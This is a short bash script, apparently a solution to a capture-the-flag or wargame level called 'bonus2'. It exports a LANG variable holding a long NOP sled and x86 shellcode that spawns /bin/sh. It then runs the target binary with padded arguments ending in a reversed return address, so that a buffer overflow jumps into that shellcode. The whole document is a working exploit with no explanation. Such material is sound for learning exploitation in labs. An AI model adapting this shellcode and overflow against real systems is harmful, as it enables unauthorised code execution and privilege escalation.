#!/bin/bash
export `python -c 'print "LANG=nl" + "\x90" * 1000 + "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
./bonus2 `python -c 'print "A" * 40'` `python -c 'print "B" * 23 + "\xbf\xff\xfc\xd0"[::-1]'`
